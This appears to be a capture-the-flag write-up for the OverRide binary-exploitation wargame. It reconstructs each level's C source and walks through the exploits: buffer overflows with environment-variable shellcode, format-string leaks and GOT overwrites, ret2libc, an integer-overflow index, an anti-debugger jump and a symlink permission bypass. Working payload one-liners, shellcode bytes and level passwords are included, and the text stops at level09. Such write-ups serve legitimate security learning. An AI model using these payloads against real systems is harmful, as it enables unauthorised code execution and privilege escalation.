# /dev/log for override

## level00 (enumeration and info gathering)
```clike=
int main()
{
    int input;
    
    puts("***********************************");
    puts ("-Level00 -");
    puts("***********************************");
    printf("Password: ");
    scanf("%d", &input);
    if (input != 5276)
    {
        puts("Invalid Password!");
        return 1;
    }
    puts("Authenticated!");
    system("/bin/sh");
    return 0;
}

```

As we can already see from the source, it compares the input with a predetermined value `5276` to run a shell. This means we should just pass in the password in the stdin and it should already work. The password is `uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL`

```
level00@OverRide:~$ ./level00 5276
***********************************
* 	     -Level00 -		  *
***********************************
Password:5276

Authenticated!
$ pwd
/home/users/level00
$ cat /home/users/level00
cat: /home/users/level00: Is a directory
$ cat /home/users/level01/.pass
uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL
$ ^C
$ 

```

## level01 (stack buffer overflow)
```clike=
static char input_buf[256];

int verify_user_name()
{
    puts("verifying username....");
    return strcmp(input_buf, "dat_wil");
}

int verify_user_pass(char *input)
{
    return strcmp(input, "admin");
}

int main()
{
    char buf1[64]; // 92 - 28
    int num;
    
    memset(buf1, 0, 16);
    num = 0;
    puts("********* ADMIN LOGIN PROMPT *********");
    printf("Enter Username:");
    fgets(input_buf, 256, stdin);
    num = verify_user_name();
    if (num != 0)
    {
        puts("nope, incorrect username");
        return 1;
    }
    puts("Enter Password:");
    fgets(buf1, 100, stdin);
    num = verify_user_pass(buf1);
    if (num != 0)
    {
        puts("nope, incorrect password");
        return 1;
    }
    return 0;
}
```

Looking at the surface, it looks like guessing the password wont help us acheive our goal. In the buffer to store the password, it looks like fgets is reading more characters than the buf1 can handle, which might be vulnerable to a buffer overflow.

I have found this python program below to help us determine the buffer overflow offset with a pattern, it is like follows.
```python=
#!/usr/bin/env python

# https://github.com/Svenito/exploit-pattern/blob/master/pattern.py
import sys

try:
    import clipboard
except ImportError:
    pass
from string import ascii_uppercase, ascii_lowercase, digits

MAX_PATTERN_LENGTH = 20280


class MaxLengthException(Exception):
    pass


class WasNotFoundException(Exception):
    pass


def pattern():
    for upper in ascii_uppercase:
        for lower in ascii_lowercase:
            for digit in digits:
                yield upper + lower + digit


def pattern_gen(length):
    """
    Generate a pattern of a given length up to a maximum
    of 20280 - after this the pattern would repeat
    """
    if length > MAX_PATTERN_LENGTH:
        raise MaxLengthException(
            "ERROR: Pattern length exceeds maximum of {0}".format(MAX_PATTERN_LENGTH)
        )

    result = ""
    for p in pattern():
        if len(result) < length:
            result += p
        else:
            return result[:length]

    # If we end up here we've exhausted all characters so truncate the pattern
    return result[:length]


def pattern_search(search_pattern):
    """
    Search for search_pattern in pattern. Convert from hex if needed
    Looking for needle in haystack
    """
    needle = search_pattern

    try:
        if needle.startswith("0x"):
            # Strip off '0x', convert to ASCII and reverse
            needle = needle[2:]
            needle = bytearray.fromhex(needle).decode("ascii")
            needle = needle[::-1]
    except (ValueError, TypeError) as e:
        raise

    haystack = ""
    for p in pattern():
        haystack += p
        found_at = haystack.find(needle)
        if found_at > -1:
            return found_at

    raise WasNotFoundException(
        "Couldn`t find {0} ({1}) "
        "anywhere in the pattern.".format(search_pattern, needle)
    )


def print_help():
    print("Usage: {0} [LENGTH|PATTERN]\n".format(sys.argv[0]))
    print("Generate a pattern of length LENGTH or search for PATTERN and ")
    print("return its position in the pattern.\n")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print_help()
        sys.exit(0)

    if sys.argv[1] == "-h" or sys.argv[1] == "--help":
        print_help()
        sys.exit(0)

    if sys.argv[1].isdigit():
        try:
            pat = pattern_gen(int(sys.argv[1]))
            try:
                clipboard.copy(pat)
                print("Pattern copied to clipboard: \n")
            except NameError:
                pass

            print(pat)

        except MaxLengthException as e:
            print(e)
    else:
        try:
            found = pattern_search(sys.argv[1])
            print(
                "Pattern {0} first occurrence at "
                "position {1} in pattern.".format(sys.argv[1], found)
            )
        except WasNotFoundException as e:
            print(e)
            sys.exit(1)
        except (ValueError, TypeError):
            print("Unable to convert hex input for searching. Invalid hex?")
            sys.exit(1)
```
I generated a pattern with the following output and I tried running it in the program. As you can see , the saved EIP for changed after the fgets call.
```
level01@OverRide:/tmp$ python pattern.py 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

![image](https://hackmd.io/_uploads/S1dLaEwIa.png)

I used the same program to find the position of the offset, and it is at 80 bytes.
```
level01@OverRide:~$ python /tmp/pattern.py 6Ac7
Pattern 6Ac7 first occurrence at position 80 in pattern.
level01@OverRide:~$
```

I used a shellcode from the site `https://shell-storm.org/shellcode/index.html` and I generated a payload. I also put the shellcode in the environment variable so that it can be jumped to by the saved EIP.

I saved the shellcode in the env like so ;
```
 export SHELLCODE=`python -c "print '\x90' * 100 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"`
 ```

Then, I need to get the address of the environment variables for the EIP to jump to. I used the `x/s *((char **)environ)` command in GDB and got the following output. As we can see, we have the address to our shellcode. I have added 20 to the final input because gdb has set **some env vars that might affect the accuracy of this reading**.
![image](https://hackmd.io/_uploads/S1yqYSPIT.png)

```
(python -c 'print "dat_wil" + "\n" + "B" * 80 + "\x81\xd8\xff\xff"'; cat) | ./level01
```

![image](https://hackmd.io/_uploads/SJoD_rDU6.png)

`PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv` is the password.

## level02 (format string vulnerability)
```clike=
int main()
{
    FILE *open_passfile;
    int read_pass_status;
    char username[100]; // 0x70 - 0xc
    char pass_file_content[48]; // 0xa0 - 0x70
    char pass[112]; // 0x110 - 0xa0
    
    memset(username, 0, 12);
    memset(pass_file_content, 0, 5);
    memset(pass, 0, 12);
    
    open_passfile = fopen("/home/users/level03/", "r");
    if (!open_passfile)
    {
        fwrite("ERROR: failed to open password file", 1, 36, stderr);
        exit(1);
    }
    
    read_pass_status = fread(pass_file_content, 1, 41, open_passfile);
    pass_file_content[strcspn(pass_file_content, "\n")] = 0;
    if (!read_pass_status)
    {
        frwite("ERROR: failed to read password file", 1, 36, stderr);
        exit(1);
    }
    fclose(open_passfile);
    
    puts("===== [ Secure Access System v1.0 ] =====");
    puts("/***************************************\\");
    puts("| You must login to access this system. |");
    puts("\\**************************************/");
    printf("--[ Username:");
    fgets(username, 100, stdin);
    username[strcspn(username, "\n")] = 0;
    printf(" --[ Password:");
    fgets(pass, 100, stdin);
    pass[strcspn(pass, "\n")] = 0;
    
    puts("*****************************************");
    if (strncmp(pass_file_content, pass, 41) == 0)
    {
        printf("Greetings, %s!", username);
        system("/bin/sh");
        return 0;
    }
    else
    {
        printf(username);
        puts("does not have access!");
        exit(1);
    }
}
```

Looking from the source, it looks like a buffer overflow may not happen on username of pass since fgets is used to read characters equals to the buffer size, but we can still try to confirm.

```
# create test input
python -c "print 'B' * 1010 + '\n' + 'A' * 1010" > /tmp/level2

# run program
./level02 < /tmp/level2
```

As we can see, the program ran without faults
```
level02@OverRide:~$ ./level02  < /tmp/level2
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB does not have access!
level02@OverRide:~$
```

I tried thinking of manipulating the user and pass input to just a null byte, but it still compares 41 characters of the open passfile.  Since strcspn is new, I went to the manual to find any security warnings; no warings.

However, I noticed in the last few lines `printf(username);` was called. This was a direct call to a user input, which leaves us with a **string format vulnerability**.

To verify this, I ran the program with some new input to test and we have a segfault.
```
# create test input
python -c "print '%3\$s' '\n' + 'AAAA\n'" > /tmp/level2

# run program
./level02 < /tmp/level2
```
It could be that its trying to derefrence an invalid address when I supplied the `%s` parameter, so I decided to just print out a series on `%p`s to get a look at the stack state at this point without the need to derefrence. As we can see, we have the stack contents displayed. And since the contents of the password from the file are pushed to the stack, we should be able to read them eventually. What we are seeing here is the function arguments that are pushed to the stack. **It does not show the `push` commands in the disassembly, it is pushed after we call the function by `lib64` from libc since this program is compiled for 64-bit CPUs, instead, we just move them to specific registers in the program.**

```
level02@OverRide:~$ python -c "print '%p %p %p %p %p %p %p' '\n' + 'A\n'" > /tmp/level2
level02@OverRide:~$ ./level02 < /tmp/level2
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4f0 (nil) 0x41 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 does not have access!
level02@OverRide:~$
```
From the surface here, we see some addresses and their contents. Hence, I made a script to automate the parsing of the stack for a number of times.

```
cat << EOF > /tmp/parse.py
# parse.py
import sys

# read input
input_string = sys.stdin.read()

# split string based on newline
lines = input_string.split('\n')

# get the last string
last_line = lines[len(lines) - 2]

# split by spaces
tokens = last_line.split(' ')
index = 0
for token in tokens:
    index += 1
    if token == "does" :
        break
    print(str(index) + ' - ' + token)
EOF
```

And the script is done, now to run it with our input and we get the results below.

```
level02@OverRide:~$ python -c "print '%p ' * 30 + '\n' + 'BBBBBBBB'" > /tmp/level2
level02@OverRide:~$ ./level02 < /tmp/level2 | python /tmp/parse.py
1 - 0x7fffffffe500
2 - (nil)
3 - 0x42
4 - 0x2a2a2a2a2a2a2a2a
5 - 0x2a2a2a2a2a2a2a2a
6 - 0x7fffffffe6f8
7 - 0x1f7ff9a08
8 - 0x4242424242424242
9 - (nil)
10 - (nil)
11 - (nil)
12 - (nil)
13 - (nil)
14 - (nil)
15 - (nil)
16 - (nil)
17 - (nil)
18 - (nil)
19 - (nil)
20 - 0x100000000
21 - (nil)
22 - 0x756e505234376848
23 - 0x45414a3561733951
24 - 0x377a7143574e6758
25 - 0x354a35686e475873
26 - 0x48336750664b394d
27 - (nil)
28 - 0x7025207025207025
29 - 0x2520702520702520
30 - 0x2070252070252070
31 -
```

Now to break it down, we first need to get some visuals on the stack
![image](https://hackmd.io/_uploads/HJ6Xnn5Lp.png)

We are tring to read the stuff in `passfile_content` and from the input we gave, the only input which is identifyable is the contents of `pass`. Which means, **once we see the contents of `pass` (which is 'BBBBBBBB'), we will need to go down the stack `0x70 = 112 (base10)` bytes to reach `passfile_content`**. 

If we look at the output, we can see lines 1 to 7 contain values that are **pushed by other function calls**, which serve no purpose. At line 8 however, we can see BBBBBBBB, which is the start of our `pass` variable. Going back to earlier, we will need to go down 112 bytes. Since `%p` traverses 8 bytes at a time, and `112 / 8 = 14`, our contents of `passfile_content` is at line `8 + 14 = 22`.

I used [this tool online](https://onlinehextools.com/convert-hex-to-string) to convert the data from hex to string, and reversed it for little endianess and I got the following string `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

I used `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H` as password for level03 and it worked

![image](https://hackmd.io/_uploads/Hk-sJaqUp.png)

## level03 (XOR cipher)
```clike!
void decrypt(uintptr_t init_addr)
{
    int var1 = 20; // canary?
    int cipher1 = 0x757c7d51; // Q}|u
    int cipher2 = 0x67667360; // `sfg
    int cipher3 = 0x7b66737e; // ~sf{
    int cipher4 = 0x33617c7d; // }|a3
    int cipher5 = 0x00000000;
    int clear_mask = 0xffffffff;
    int cipherlen = 0;
    int count = 0;
    int xor_res = 0;
    int temp = 0;
    
    cipherlen = strlen(&cipher1);
    while (count < cipherlen)
    {
        xor_res = &cipher1[count] ^ init_addr;
        &cipher1[count] = xor_res;
        ++count;
    }
    if (!strncmp(cipher1, "Congratulations!", 17))
    {
        system("/bin/sh");
        return ;
    }
    puts("Invalid Password");
}

void test(int pwinput, uintptr_t init_addr)
{
    uintptr_t res = init_addr - pwinput;
    
    if (init_addr > 21)
    {
        decrypt(rand());
    }
    else {
        sub *= 4;
        sub += 0x80489f0;
        decrypt(res); return;
        decrypt(res); return;
        decrypt(res); return;
        decrypt(res); return;
        decrypt(res); return;
        decrypt(res); return;
        decrypt(res); return;
        decrypt(res); return;
        decrypt(res); return;
        decrypt(res); return;
        decrypt(res); return;
        decrypt(res); return;
        decrypt(res); return;
        decrypt(res); return;
    }
}

int main()
{
    int pwinput;
    
    srand(time(0));
    puts("***********************************");
    puts("*               level03         **");
    puts("***********************************");
    printf("Password:");
    scanf("%d", &pwinput);
    test(pwinput, 0x1337d00d);
}
```

The program takes in a decimal as the password and runs some decryption methods to check for the password. Looking at the code, it seems like we are not going to be doing any overflows since there is an existence of a canary. Hence, we will need to work on the decryption itself.

We noticed that this is a [XOR Cipher](https://en.wikipedia.org/wiki/XOR_cipher) where every bit in the plaintext is XOR'ed against every bit in a key. It is a good fundamental encryption becase in XOR encryption, **It is clear that if nothing is known about the key or plaintext, nothing can be determined from the ciphertext alone**.

in a nutshell, our `decrypt` function takes in `init_addr`, this will be our key. The plaintext in this case is the consecutive bytes in `cipher1` to `cipher5`.The encrypted text is `"Congratulations!"`. The program takes the key as the input an encrypts the plaintext with it to compare if the ciphertext is correct. If it is, we will be able to access shell.

If we look at this table, we can see some basic operations of the XOR cipher. If we have the ciphertext and the plaintext, **to get key, we can use `plaintext ^ ciphertext`**
![image](https://hackmd.io/_uploads/BkjPPUj8a.png)

As we can see, using a decoder, the key is `18` for all characters 
![image](https://hackmd.io/_uploads/SkAOoTiIT.png)

And since the input needs to be deducted by `0x1337d00d` to get the key, our input should be `0x1337d00d - 0x12(18)` which is `0x1337cffb` or `322424827` in base 10. We are able to get the password `kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf`

![image](https://hackmd.io/_uploads/H1-rn6jLT.png)


## level04 (ptracing / shellcode injection with limited function calls)
```clike!
int main()
{
    char child_input[136]; // 168 - 32
    int pid;
    inr wait_status;
    int ptrace_res;
    
    pid = fork();
    memset(child_input, 0, 32);
    ptrace_res = 0;
    wait_status = 0;
    if (pid == 0)
    {
        prctl(PR_SET_PDEATHSIG, SIGHUP);
        ptrace(PTRACE_TRACEME, 0, 0, 0);
        puts("Give me some shellcode, k");
        gets(child_input);
        return 0;
    }
    else
    {
        wait(&wait_status);
        if (WIFEXITED(wait_status) || WIFSIGNALED(wait_status))
        {
            puts("child is exiting");
            return 0;
        }
        if (ptrace(PTRACE_PEEKUSER, pid, 44, NULL) == 11)
        {
            puts("no exec() for you");
            kill(pid, 9);
            return 0;
        }
    }
}
```

On the surface, this looks like a buffer overflow vulnerability with a `gets()` call on a limited size buffer. The catch is, we are unable to call `exec()` in the child for the buffer overflow. Which means we have to use other functions like `system()`

First off, I located the EIP offset with the help of **[Buffer Overflow EIP Offset String generator](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)** To generate the string pattern and matching.

By setting **`set follow-fork-mode child`** in GDB, im able to trace through the fork and obtain the offset as `156`. Since we are using other functions, we have to find the addresses loaded in memory. which is the pointer to the `system()` function and the string `/bin/sh`. This can be acheived using `print system` and `find __libc_start_main,+99999999,"/bin/sh"` (find from libc main for 99999999 bytes "/bin/sh").

Our pointer to `system()` is `0xf7e6aed0`, our pointer to "/bin/sh" is `0xf7f897ec`.
![image](https://hackmd.io/_uploads/rJfxRy2Up.png)

Hence, we can generate our shellcode like so
```
python -c "print 'B' * 156 + '\xf7\xe6\xae\xd0'[::-1] + 'BEEF' + '\xf7\xf8\x97\xec'[::-1]" > /tmp/level04

 (cat /tmp/level04 ; cat) | ./level04
```

And we have our password `3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN`
```
level04@OverRide:~$  (cat /tmp/level04 ; cat) | ./level04
Give me some shellcode, k
pwd
/home/users/level04
whoami
level05
cat /home/users/level05
cat: /home/users/level05: Is a directory
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
## level05 (format string vulnerability with GOT overwrite)
```clike!
int main()
{
    int count = 0;
    char inputbuf[?];
    
    fgets(inputbuf, 100, stdin);
    count = 0;
    while(strlen(inputbuf) > count)
    {
        if (inputbuf[count] <= 64 && inputbuf[count] > 90)
        {
            ++count;
            continue;
        }
        else
        {
            inputbuf[count] = inputbuf[count] ^ 32;
            ++count;
        }
    }
    printf(inputbuf);
    exit(0);
}
```

In the last two lines, we see a **printf call to user input**, which indicates a format string vulnerability. We also noticed that the program calls `exit()` and its complete and not return, which means we are enable to overwrite the EIP, and had to overwrite the GOT for `exit()` instead. 

We also noticed that the program decapitalizes any characters in the input buffer, so that is something to take note of. The first step would be to find the offset of the printf stack address to the contents of the first printf argument. I have made a script to go through the stack to display its contents

```
cat << EOF > /tmp/test.py
import os
import sys
for i in range(1, 42, 1) :
    os.system("echo '' > /tmp/output; echo 'iiii %{}\$p' | /home/users/level05/level05 >> /tmp/output".format(i))
    output = open('/tmp/output', 'r').read()
    sys.stdout.write("{} - ".format(i))
    sys.stdout.write(output[1:])
EOF

python /tmp/test.py
```

As we can see the contents are at **the 10th `%p`**. This is important because we will be putting our GOT address here to be read, and overwritten using `%n`. To locate the GOT address for `exit()`, we can check the relocation entries using `objdump -R ./level05` and we can see its `080497e0`. So our new input should be pointing to that address and printing it out for now. **We also should replace `%p` with `%hhn` so the system will write to that address** on how many bytes we have printed

```
python -c "print '\x08\x04\x97\xe0'[::-1] + 'B' * 12 + '%10\$hhn'" > /tmp/level05
./level05 < /tmp/level05
```

As we can see, we have successfully written over the GOT. So we just need to replace this with a pointer to the shellcode, which I will put in the environment variable.
![image](https://hackmd.io/_uploads/rJLq0Q2Ip.png)

The shellcode will be a simple `execve(/bin/sh)` I found [here](https://shell-storm.org/shellcode/). I will be exporting this in the environment variable and we will be getting the address via GDB. As we can see, our address is `0xffffd85e` but we have a NOP sled, so let make it safer by assuming its  `0xffffd87e`

```
export SHELLCODE=`python -c "print '\x90' * 100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"`
```
![image](https://hackmd.io/_uploads/ryPQ64nUT.png)

With this information, we can now construct our payload like so:
```
0x080497e0 - d87e (55414 bytes)
0x080497e2 - ffff (10113 bytes from last)
```

```
(python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55414x' + '%10\$hn' + '%10113x' + '%11\$hn'" ; cat)| ./level05
```

And we got our password `h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq`
![image](https://hackmd.io/_uploads/ByxB0VhI6.png)

## level06 (enumeration protction / direct jumps)
```clike=
int auth(char *logininput, unsigned int serial_input)
{
    int loginlen;
    int count;
    unsigned int enc_logininput;
    
    logininput[strcspn(logininput, "\n")] = 0;
    loginlen = strlen(logininput);
    if (loginlen < 5) return 1;
    enc_logininput = (logininput[3] ^ 4919) + 6221293;
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1)
    {
        puts("\033[32m.---------------------------.");
        puts("\033[31m| !! TAMPERING DETECTED !!  |");
        puts("\033[32m'---------------------------'");
        return 1;
    }
    count = 0;
    while(count < loginlen)
    {
        // TODO encryption logic here
        if (logininput[count] <= 31)
            return 1;
        
        int stage1 = logininput[count] ^ enc_logininput;
        int stage2 = 0x88233b2b * stage1;
		int stage3 = (stage1 - stage2) >> 1;
        int stage4 = (stage3 + stage2) >> 10 * 1337;
        enc_logininput += (stage1 - stage4);
        
        ++count;
    }
    if (enc_logininput == serial_input)
        return 0;
    return 1;
}

int main(int argc, char **argv)
{
    char logininput[?];
    unsigned int serial_input;
    
    puts("***********************************");
    puts("*    level06    *");
    puts("***********************************");
    printf("-> Enter Login:");
    fgets(logininput, 32, stdin);
    puts("***********************************");
    puts("*    NEW ACOUNT DETECTED    *");
    puts("***********************************");
    printf("-> Enter Serial:");
    scanf("%u", &serial_input);
    
    if (!auth(logininput, serial_input))
    {
        system("/bin/sh");
        return 0;
    }
    return 1;
}
```

The program prompts the user for two inputs, where it will encrypt / hash the first one to check that if it matches the second. **Buffer overflow is protected as there is a canary inside the executable**. Our only way to get a shell is to get the first inputs hash correct with the second input.

We can generate a key of our own now since we know the logic, or **we could just use GDB and inspect the stack instead**. I used gdb and added a breakpoint at `8048866`, which is where the program checks for the output. I used a simple `asdfg` input to get the correct encryption by running the program.

Since they have a debugger check, we will use a **manual jump to jump over the check itself**. We will add a breakpoint before and after the check so that we can manually jump over it without messing up the memory state (break at `80487b5`, jmp to `80487ba`). As we can see, its comparing to the decimal `6229077`
```
cat << EOF > /tmp/level06
ASDFGH
12345
EOF

gdb ./level06

b *0x80487b5
b *0x8048866
lay asm
focus cmd
tty /dev/pts/1
set disassembly-flavor intel
run < /tmp/level06
jump *0x80487ba
x/10d $ebp-0x10
```

![image](https://hackmd.io/_uploads/S1ATR2T86.png)

We change our key to 6229077 and it worked, our password is `GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8`

![image](https://hackmd.io/_uploads/ByXOJapUp.png)


## level07 (integer overflow)
```clike=
void clear_stdin()
{
    char curr;
    
    while(1)
    {
        curr = getchar();
        if (curr == '\n' || curr == -1)
            return ;
    }
}

unsigned int get_unum()
{
    unsigned int res;
    
    fflush(stdout);
    scanf("%u", &res);
    clear_stdin();
    return res;
}

int store_number( int *meat)
{    
    unsigned int num_input = 0;
    unsigned int idx_input = 0
    unsigned int temp1 = 0xaaaaaaab;
        
    printf("Number: ")
    num_input = get_unum();
    printf("Index: ")
    idx_input = get_unum();
    
    idx_input += temp1;
    temp1 = temp1 >> 1;
    unsigned int temp2 = temp1;
    temp2 *= 2;
    temp2 += temp1;
    unsigned int temp3 = 0xaaaaaaab - temp2;
    if(temp3 != 0 || num_input >> 0x18 != 0xb7)
    {
        meat[idx_input] = num_input;
        return 0;
    }
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    return 1;
}

int read_number(unsigned int *meat)
{
    int num_input = 0;
    
    printf("Index: ");
    num_input = get_unum() << 2 + meat;
    printf("Number at data[%u] is %u, ", num_input, meat[num_input]); // does << 2 + meat implicitly
    return 0;
}


int main(int argc, char **argv, char **envp)
{
    char **argv_stack = argv;
    char **envp_stack = enp;
    int op_ret = 0;
    char user_cmd[20] = 0; // 4 * 5
    int meat[16]; // 64 / 4
    
    memset(meat, 0, 16);
    while(argv_stack)
    {
        memset(*argv_stack, 0, strlen(*argv_stack));
        ++argv_stack;
    }
    
    while(envp_stack)
    {
        memset(*envp_stack, 0, strlen(*envp_stack));
        ++envp_stack;
    }
    
     puts("----------------------------------------------------\n"\
           "  Welcome to wil's crappy number storage service!   \n"\
           "----------------------------------------------------\n"\
           " Commands:                                          \n"\
           "    store - store a number into the data storage    \n"\
           "    read  - read a number from the data storage     \n"\
           "    quit  - exit the program                        \n"\
           "----------------------------------------------------\n"\
           "   wil has reserved some storage :>                 \n"\
           "----------------------------------------------------\n"\
           "\n");
    
    while(1)
    {
        op_ret = 1；
        printf("Input command: ");
        fgets(user_cmd, 20, stdin);
        user_cmd[strcspn(user_cmd, "\n")] = 0;
        
        if (!strncmp(user_cmd, "store", 5))
            op_ret = store_number(meat);
        else if (!strncmp(user_cmd, "read", 4))
            op_ret = read_number(meat);
        else if (strncmp(user_cmd, "quit", 4))
            break;
        
        if (!op_ret)
            printf("Completed %s command successfully", user_cmd);
        else 
            printf("Failed to do %s command\n", user_cmd);
       
       memset(user_cmd, 0, 20);
       op_ret = 1;
    }
    return 0;
}

```

This program allows is to **store numbers in an int buffer**. During the storing process, there is no check that the index is within the buffers size, they only check if it allowed other constraints such as some mathematical properties on the `idx_input` and `num_input`.

After some trials, we figurerd that the first constraint in `store_number(int )` checks if the index is a **not modulo of 3 `temp3 != 0`**. The second constraint checks if the number input is not `3070230528`. If any of those constraints are true, the number is written into the buffer at `meat[index] = input`. 

Since they dont do index size checking, we are able to segfault the program if we provide a faulty index.

![image](https://hackmd.io/_uploads/SJiut0yw6.png)

To determind the offset to the EIP, we try to input a test value and inspect the memory layout of the program.

```
cat << EOF > /tmp/level07
store
286331153
1
quit
EOF

gdb ./level07
b *0x80486ce
lay asm
focus cmd
tty /dev/pts/0
set disassembly-flavor intel
run < /tmp/level07
```
As we can see, `meat` at index 1 is at `0xffffd548`. And the EIP is at `0xffffd70c`. We are able to overwrite the EIP since the **EIP address is > the buffer address**. With this , we are able to find the offset which is `70c - 548 = 1C4 or 452 in base 10`.

```
(gdb) x/10x $eax
0xffffd548:     0x11111111      0x00000000      0x00000000      0x00000000
0xffffd558:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd568:     0x00000000      0x00000000
...
...

(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x80488ef in main; saved eip 0xf7e45513
 Arglist at 0xffffd708, args:
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704, eip at 0xffffd70c
```

The index we need to write to will be `452 / 4 = 113`. We can test this out
As we can see, we are 4 bytes before the EIP address. However, to actually overwrite the EIP, we need to input as index `114`, which is not allowed by the function. 
```
cat << EOF > /tmp/level07
store
286331153
113
quit
EOF

gdb ./level07
b *0x80486ce
b *0x80488ef
lay asm
focus cmd
tty /dev/pts/0
set disassembly-flavor intel
run < /tmp/level07
```
![image](https://hackmd.io/_uploads/rkWv71eDa.png)

To overcome this, we can use alternatives like **`2 * (UINT_MAX / 4) + 114` to overflow back to `114`** without actually using the number. As we can see, we have successfully overwritten the EIP with our desired value.

```
cat << EOF > /tmp/level07
store
286331153
2147483762
store
572662306
2147483764
quit
EOF

gdb ./level07
b *0x80486ce
b *0x80488ef
lay asm
focus cmd
tty /dev/pts/0
set disassembly-flavor intel
run < /tmp/level07
```

```
Breakpoint 2, 0x080488ef in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x80488ef in main; saved eip 0x11111111
 Arglist at 0xffffd708, args:
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704, eip at 0xffffd70c
  ```

Since we are able to ovewrite the address now, we should be able to overwrite it to an address which points to shellcode. We will be trying ret2libc for this. We needed the address for the `system()` function as well as `/bin/sh`. These information should be available in GDB. The address of `system()` is `0xf7e6aed0` and the address for "/bin/sh" is `0xf7f897ec` 

```
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```

We can generate our payload like so and able to retreive the password `7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC`
```
cat << EOF > /tmp/level07
store
4159090384
2147483762
store
4160264172
2147483764
quit
EOF

(cat /tmp/level07 ; cat) | ./level07
```

![image](https://hackmd.io/_uploads/SJXwO-xP6.png)

## level08 (file permission bypass using softlink)
```clike=

void log_wrapper(FILE *logfile, char *string, char *inpfile_path)
{
    int count = 40;
    char dest[?];
    
    strcpy(dest, string);
    snprintf(dest + strlen(dest), 254 - strlen(dest) - 1, inpfile_path);
    dest[strcspn(dest, "/n")] = 0;
    fprintf(logfile, "LOG: %s", dest);
}

int main(int argc, char **argv)
{
    int argc_stck = argc;
    char **argv_stack = argv;
    int count = 48;
    char currchar = EOF;
    FILE *logfile;    
    char *prefix = "./backups";
    char dest[?];
    int backupfile;
    
    if (argc != 2)
        printf("Usage: %s filename", argv[0]);
    logfile = fopen("/backups/.log", "w");
    if (!logfile)
    {
        printf("ERROR: Failed to open %s", "/backups/.log");
        exit(1);
    }
    log_wrapper(logfile, "Starting back up:", argv_stack[1]);
    inputfilestream = fopen(argv_stack[1], "r");
    if (!inputfilestream)
    {
        printf("ERROR: Failed to open %s", argv_stack[1]);
        exit(1)
    }
    strcpy(dest, prefix);
    strncat(dest, argv_stack[1], 99 - strlen(dest) - 1);
    backupfile = open(prefix, O_CREAT | O_EXCL | O_WRONLY, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
    if (backupfile < 1)
    {
        printf("ERROR: Failed to open %s%s\n", "./backups/", argv_stack[1]);
        exit(1);
    }
     while((currchar = fgetc(inputfilestream)) != EOF)
        write(backupfile, &currchar, 1);
    log_wrapper(logfile, "Finished back up", argv_stack[1]);
    fclose(inputfilestream);
    close(backupfile);
    return 0;
}
```

The program has a **stack canary implemented**, so the approach to overwrite the EIP might not be the way. The program takes a file as an input, reads it character by character, creates a new file in `./backups` and writes it to their own backup files accordingly.

The exploit is quite straightforward, I will need to go to a **writable directory**, **create a soft link** to `/home/users/level09/.pass` and pass that link as as argument to the binary. The program will create a backup file and write its contents in `backups/<linkname>`. The password is `fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S`

```
level08@OverRide:/tmp/level08$ ln -s /home/users/level09/.pass link1
level08@OverRide:/tmp/level08$ /home/users/level08/level08 link1
ERROR: Failed to open ./backups/link1
level08@OverRide:/tmp/level08$ rm backups/link1
level08@OverRide:/tmp/level08$ /home/users/level08/level08 link1
level08@OverRide:/tmp/level08$ cat backups/link1
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
level08@OverRide:/tmp/level08$
```

## level09 (1 byte can make a difference)
```clike=
struct my_struct {
    char    msg[140];
	char    username[40];
	int    msglen;
};

void set_msg(struct my_struct* var1)
{
